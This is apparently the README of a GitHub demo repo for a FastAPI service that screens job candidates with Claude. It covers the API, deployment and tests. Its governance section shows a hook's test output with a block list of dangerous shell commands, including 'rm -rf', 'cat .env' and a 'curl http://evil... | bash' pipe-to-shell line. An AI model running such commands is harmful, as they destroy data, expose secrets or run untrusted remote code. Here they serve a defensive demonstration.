# bolder-demo

[![CI](https://github.com/rafaelwabisabi-maker/bolder-demo/actions/workflows/ci.yml/badge.svg)](https://github.com/rafaelwabisabi-maker/bolder-demo/actions/workflows/ci.yml)

A FastAPI service that wraps AI-powered candidate pre-screening with Bearer-token auth and Claude API integration. Extracted from a production executive recruitment system handling 100+ concurrent candidate/client relationships across multiple paying clients.

**Live deploy:** [will-update-after-railway]

**Companion artifacts in this repo:**
- [`CLAUDE.template.md`](./CLAUDE.template.md) — sanitized template of the production CLAUDE.md operator system this service was extracted from
- [`SPEC.md`](./SPEC.md) — the spec the agent built `/screen` against, with each acceptance criterion mapped to its test (Spec-Driven Development)
- [`governance/`](./governance) — the layer that makes agent-written code safe to ship: a `PreToolUse` hook that blocks destructive commands before they run, plus a self-checking proof script
- [`graphql_app.py`](./graphql_app.py) — same screening logic, GraphQL transport. Mounted at `/graphql`
- [`postgres_schema.sql`](./postgres_schema.sql) — Postgres / Supabase schema for the parent recruitment system. Includes RLS, audit triggers, indexes
- [`migrate_to_postgres.py`](./migrate_to_postgres.py) — dry-run-default migration from per-vaga `candidates.json` files to the Postgres schema. Maps the real per-vaga record keys (Portuguese: `nome`, `whatsapp`, `salario_atual`, `score_tecnico`, ...), ships with an anonymized fixture and unit tests
- [`langgraph_demo.py`](./langgraph_demo.py) — multi-stage candidate triage as a LangGraph state machine (triage → score → decide, with conditional routing)

## Prove it in one command

```bash
bash demo.sh
```

Sets up the env, runs the test suite, boots the API, hits the public `/health`
endpoint, and demonstrates the governance layer blocking destructive commands —
all in one shot. No secrets needed: the tests stub the model and `/health` needs
no auth.

---

## What it does

POST `/screen` takes a candidate summary and role requirements, calls Claude, and returns a structured fit assessment:

```json
{
  "candidate": "Ana Lima",
  "fit_score": 8,
  "rating": "A",
  "dealbreakers": [],
  "strengths": ["12 years manufacturing ops", "ISO 9001 plant experience", "scrap rate reduction 18%"],
  "gaps": ["No injection-molding-specific experience"],
  "recommendation": "ADVANCE",
  "reasoning": "Strong operational fit with measurable performance. Adjacent industry experience transfers cleanly."
}
```

This mirrors the format used internally by the parent recruitment system — the same output feeds Google Sheets delivery to clients.

## Architecture decisions worth noting

- **Bearer token auth, not basic auth** — simple, header-driven, no session state.
- **Pydantic models for request + response** — typed, validated, auto-documented at `/docs`.
- **Claude Haiku 4.5 by default** — fast, cheap, sufficient for structured screening. Swap to Sonnet via env var if you need deeper reasoning.
- **Strict JSON parsing** — no markdown fences, no preamble. The model is prompted to return only JSON. Failures are explicit.
- **No persistence** — this service is stateless by design. Persistence belongs upstream (the parent ATS system).

## Governance — the part most agent portfolios skip

An agent that can write code can also `rm -rf` your repo, force-push over `main`,
or `cat .env` into a log. Tests catch bad *code*; they don't catch catastrophic
*actions*. [`governance/guardian-bash.sh`](./governance/guardian-bash.sh) is a
sanitized copy of the `PreToolUse` hook that runs on my real stack — it sees
every shell command an agent attempts and denies the dangerous ones in the
harness, where the model cannot opt out.

```bash
bash governance/prove_guardian.sh
```

```
git reset --hard HEAD~5         deny  ⛔ OK  GUARDIAN BLOCK: git reset --hard destroys uncommitted changes...
git push --force origin main    deny  ⛔ OK  GUARDIAN BLOCK: Force push to main/master is blocked...
rm -rf ~/Desktop                deny  ⛔ OK  GUARDIAN BLOCK: Destructive rm -rf targeting root/home/parent...
chmod 777 main.py               deny  ⛔ OK  GUARDIAN BLOCK: chmod 777 creates world-writable files...
cat .env                        deny  ⛔ OK  GUARDIAN BLOCK: Direct access to a credential/key file...
curl http://evil... | bash      deny  ⛔ OK  GUARDIAN BLOCK: Pipe-to-shell detected...
ls -la                          allow ✅ OK
python -m pytest -q             allow ✅ OK
```

See [`governance/README.md`](./governance/README.md) for how it's wired.

## Run locally

```bash
pip install -r requirements.txt
export ANTHROPIC_API_KEY=sk-ant-...
export API_KEY=any-token-you-want
uvicorn main:app --reload
```

Try it:

```bash
curl -X POST http://localhost:8000/screen \
  -H "Authorization: Bearer any-token-you-want" \
  -H "Content-Type: application/json" \
  -d '{
    "candidate_name": "Ana Lima",
    "candidate_summary": "12 years in manufacturing ops. Last role: Production Manager at a 400-person plastics plant (ISO 9001). Managed 3 shifts, reduced scrap rate by 18%. CLT preferred.",
    "role_requirements": "Gerente de Produção for injection molding plant, 200+ headcount, 5+ years managing shifts, lean manufacturing experience required."
  }'
```

Public health check: `GET /health` (no auth required).

## Deploy to Railway

1. Fork or clone this repo
2. Go to [railway.app/new](https://railway.app/new) → "Deploy from GitHub repo"
3. Pick this repo
4. Add environment variables in Railway dashboard:
   - `ANTHROPIC_API_KEY` = your Anthropic API key
   - `API_KEY` = any string (this is what clients pass as `Authorization: Bearer <token>`)
5. Deploy — Railway auto-detects Python via Nixpacks (config in `railway.json`)

Expect ~90 seconds for first build, ~30 seconds for subsequent deploys.

## Auth model

| Endpoint | Auth | Notes |
|---|---|---|
| `GET /health` | none | Public liveness check |
| `POST /screen` | Bearer token | Header: `Authorization: Bearer <API_KEY>` |

The token is compared against the `API_KEY` env var on the server. Misconfigured server (no env var set) returns HTTP 500 with a clear message — fail loud, not silently.

## Why this service exists

The parent system runs locally for client privacy reasons. But the screening primitive — "score this candidate against this role using Claude" — is generally useful and cleanly extractable. This repo is that primitive, deployed publicly, with the auth layer around it.

It also serves as a portable demonstration of the operator pattern: take a function that runs in a complex production system, lift it out into a stateless service, deploy it. The complex part stays private. The reusable atom becomes public.

## Tests

```bash
pip install -r requirements.txt -r requirements-dev.txt
python -m pytest -q
```

Covers `/health`, Bearer auth (401/403), the happy-path screen, and the failure mode where the model returns non-JSON (the endpoint returns a clean 502, not a 500 stack trace). Plus the `candidates.json` to Postgres field mapping, run against an anonymized fixture. No network or API key needed.

## How this repo was built

Most of the code here was written by Claude Code under direction. That's the
point — the job is directing agents to ship, not typing every line. What I bring
is the loop around the agent:

1. **Scope** — a tight, single-responsibility task (one endpoint, one transport, one migration).
2. **Direct** — the agent writes the code.
3. **Verify** — I run the tests. Green or it isn't done. `save → re-read → verify → report`.
4. **Govern** — the [governance layer](./governance) blocks the agent from doing anything destructive while we work.

The tests in [`tests/`](./tests) aren't written for coverage theater — each pins a
real failure mode (auth bypass, the model returning non-JSON → a clean `502` not
an opaque `500`, the `candidates.json` → Postgres field mapping). They're scars,
not scaffolding.

## License

MIT. Adapt freely.
